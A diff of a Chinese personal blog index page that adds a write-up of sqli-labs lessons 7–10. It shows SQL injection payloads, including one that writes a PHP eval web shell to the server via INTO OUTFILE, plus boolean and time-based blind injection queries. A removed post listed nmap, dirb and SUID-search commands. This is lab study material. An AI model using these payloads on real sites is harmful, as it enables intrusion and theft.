@@ -127,7 +127,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -167,6 +167,105 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/04/less7-8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/04/less7-8/" class="post-title-link" itemprop="url">less7-10</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-11-04 17:53:22 / Modified: 18:13:03" itemprop="dateCreated datePublished" datetime="2021-11-04T17:53:22+08:00">2021-11-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="less7（一句话木马的利用）"><a href="#less7（一句话木马的利用）" class="headerlink" title="less7（一句话木马的利用）"></a>less7（一句话木马的利用）</h1><p>首先按部就班试出</p>
+<p>？id=1‘))–+</p>
+<p>利用order by查出数据库列数 </p>
+<p>提示是use outfile </p>
+<p>into outfile 是写文件的指令，资料<a target="_blank" rel="noopener" href="https://blog.csdn.net/cuiruidu3106/article/details/100439103?utm_source=app&app_version=4.17.2&code=app_1562916241&uLinkId=usr1mkqgl919blen">引用csdn的大佬</a></p>
+<p>利用union select 1,2,‘&lt;?php @eval($_post[“crow”]);？&gt;’ into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7\a.php”–+将一句话木马写入</p>
+<p><img src="https://i.loli.net/2021/11/04/xWTdpgA8jq5eXht.png" alt="QQ截图20211104171541.png"></p>
+<p>这里报错了没事，现在文件已经写到我们想要的地方</p>
+<p><img src="https://i.loli.net/2021/11/04/jZrFiNRp9PG4Az1.png" alt="QQ截图20211104173133.png"></p>
+<p>然后使用菜刀访问即可！</p>
+<p><img src="https://i.loli.net/2021/11/04/wWXQb2Tgo8EDuBJ.png" alt="QQ截图20211104171109.png"></p>
+<p>ps：操作前提该网站允许文件的读入操作，不然会一直报错且菜刀也访问不到文件。</p>
+<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><h2 id="方法一-布尔盲注"><a href="#方法一-布尔盲注" class="headerlink" title="方法一 布尔盲注"></a>方法一 布尔盲注</h2><p>输入？id=1‘判断存在注入错误</p>
+<p>输入？id=1’ order by 3–+ 当3改成4时报错说明只有4列</p>
+<p>输入？id=1‘and left（（database（）），1）=’s‘–+ 猜出第一位</p>
+<p>或者采用？id=1’‘and ascii（substr（（database（）），1,1））&gt;16</p>
+<p>或者输入？id=1’ and ascii((select schema_name from information_schema.schemata limit 1,1)1,1)&gt;17–+也可以回应，判断数据库名</p>
+<p>输入？id=1‘and acii（（select table_name from information_schema.tables where table_schema=’scurity’））&gt;115–+判断表名</p>
+<p>输入？id=1’and ascii（（select column_name from information_schema.columns where table_name=’user’））&gt;10–+判断表中字段。</p>
+<p>以上语句配合burpsuite进行使用（与lesson5,6同理）。</p>
+<h2 id="法二-时间盲注"><a href="#法二-时间盲注" class="headerlink" title="法二 时间盲注"></a>法二 时间盲注</h2><p>？id=1‘ and sleep（5）–+判断存在注入 如果可以会延迟5秒回应（对比可见延迟）</p>
+<p><img src="https://i.loli.net/2021/11/04/2d5OTQ68ZArtSMz.png" alt="QQ截图20211104174905.png"></p>
+<p><img src="https://i.loli.net/2021/11/04/xYsm5MioZyjcPFr.png" alt="QQ截图20211104175501.png"></p>
+<p>输入？id=1‘ and if(length(database())=8,1,sleep(5))–+如果为8则页面会较快的刷新，如果不为8则会延迟5秒刷新</p>
+<p>输入？id=1’ and if（ascii（substr（select database（），1,1））&gt;113,1,sleep(5))–+如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5秒</p>
+<h1 id="less-9和less-10"><a href="#less-9和less-10" class="headerlink" title="less 9和less 10"></a>less 9和less 10</h1><p>less9和less10中可以使用时间盲注但不可以使用布尔盲注，less10只是将单引号改成了双引号</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -682,7 +781,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-06 17:15:51" itemprop="dateModified" datetime="2022-02-06T17:15:51+08:00">2022-02-06</time>
+        <time title="Modified: 2022-02-25 21:28:38" itemprop="dateModified" datetime="2022-02-25T21:28:38+08:00">2022-02-25</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -806,6 +905,7 @@
 <p>select user() regexp ‘r’;    regexp为匹配字符串user()的正则表达式，不管输入多少，相同                                                                                                                                                                                                  </p>
 </blockquote>
 <hr>
+<p><img src="https://s2.loli.net/2022/02/25/OaveyfJD5Slhq8u.png" alt="QQ浏览器截图20190406021639.png"></p>
 
       
     </div>
@@ -984,7 +1084,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-18 20:58:06" itemprop="dateModified" datetime="2022-02-18T20:58:06+08:00">2022-02-18</time>
+        <time title="Modified: 2022-02-26 16:26:20" itemprop="dateModified" datetime="2022-02-26T16:26:20+08:00">2022-02-26</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1320,91 +1420,6 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="冷知识"><a href="#冷知识" class="headerlink" title="冷知识"></a>冷知识</h1><h2 id="冷知识1号-robort-txt中藏着不允许和允许探测的文件名"><a href="#冷知识1号-robort-txt中藏着不允许和允许探测的文件名" class="headerlink" title="冷知识1号: robort.txt中藏着不允许和允许探测的文件名"></a>冷知识1号: robort.txt中藏着不允许和允许探测的文件名</h2><h2 id="冷知识2号-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"><a href="#冷知识2号-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作" class="headerlink" title="冷知识2号: ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"></a>冷知识2号: ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作</h2><h2 id="冷知识3号-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"><a href="#冷知识3号-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站" class="headerlink" title="冷知识3号: crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"></a>冷知识3号: crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站</h2><h2 id="冷知识4号-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"><a href="#冷知识4号-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程" class="headerlink" title="冷知识4号: audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"></a>冷知识4号: audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程</h2><h2 id="HTTP-Referer-告知服务器请求来源（浏览器自动加上）"><a href="#HTTP-Referer-告知服务器请求来源（浏览器自动加上）" class="headerlink" title="HTTP Referer: 告知服务器请求来源（浏览器自动加上）"></a>HTTP Referer: 告知服务器请求来源（浏览器自动加上）</h2><h3 id="302或301状态码表示跳转"><a href="#302或301状态码表示跳转" class="headerlink" title="302或301状态码表示跳转"></a>302或301状态码表示跳转</h3><h3 id="Cookie-服务器颁发的凭证"><a href="#Cookie-服务器颁发的凭证" class="headerlink" title="Cookie: 服务器颁发的凭证"></a>Cookie: 服务器颁发的凭证</h3><h3 id="网页-HTML-JS-CSS"><a href="#网页-HTML-JS-CSS" class="headerlink" title="网页=HTML+JS+CSS"></a>网页=HTML+JS+CSS</h3><h2 id="JS-给网页添加动态效果"><a href="#JS-给网页添加动态效果" class="headerlink" title="JS: 给网页添加动态效果"></a>JS: 给网页添加动态效果</h2><h2 id="CSS-给网页添加样式和图片"><a href="#CSS-给网页添加样式和图片" class="headerlink" title="CSS: 给网页添加样式和图片"></a>CSS: 给网页添加样式和图片</h2><h2 id="Html-超文本标记语言能加载CSS图片和JS样式"><a href="#Html-超文本标记语言能加载CSS图片和JS样式" class="headerlink" title="Html: 超文本标记语言能加载CSS图片和JS样式"></a>Html: 超文本标记语言能加载CSS图片和JS样式</h2><hr>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/" class="post-title-link" itemprop="url">“菜鸟笔记1号”</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-09-19 13:24:27" itemprop="dateCreated datePublished" datetime="2021-09-19T13:24:27+08:00">2021-09-19</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-23 12:49:43" itemprop="dateModified" datetime="2022-02-23T12:49:43+08:00">2022-02-23</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%B8%B8%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">常识</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"><a href="#对于一个给定对应IP地址的靶场机器挖掘开放服务信息" class="headerlink" title="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"></a>对于一个给定对应IP地址的靶场机器挖掘开放服务信息</h2><h3 id="为了得到靶场开放服务和服务版可使用"><a href="#为了得到靶场开放服务和服务版可使用" class="headerlink" title="为了得到靶场开放服务和服务版可使用"></a>为了得到靶场开放服务和服务版可使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -sV +IP</span><br></pre></td></tr></table></figure>
-<h3 id="为了得到靶场全部信息"><a href="#为了得到靶场全部信息" class="headerlink" title="为了得到靶场全部信息"></a>为了得到靶场全部信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -A -v+IP</span><br></pre></td></tr></table></figure>
-<h3 id="对开放http的服务用浏览器访问"><a href="#对开放http的服务用浏览器访问" class="headerlink" title="对开放http的服务用浏览器访问"></a>对开放http的服务用浏览器访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -o+IP</span><br></pre></td></tr></table></figure>
-<h3 id="探索该服务的隐藏文件"><a href="#探索该服务的隐藏文件" class="headerlink" title="探索该服务的隐藏文件"></a>探索该服务的隐藏文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dirb</span> http//***/</span><br></pre></td></tr></table></figure>
-<h3 id="查找具有权限root的文件"><a href="#查找具有权限root的文件" class="headerlink" title="查找具有权限root的文件"></a>查找具有权限root的文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<hr>
 
       
     </div>
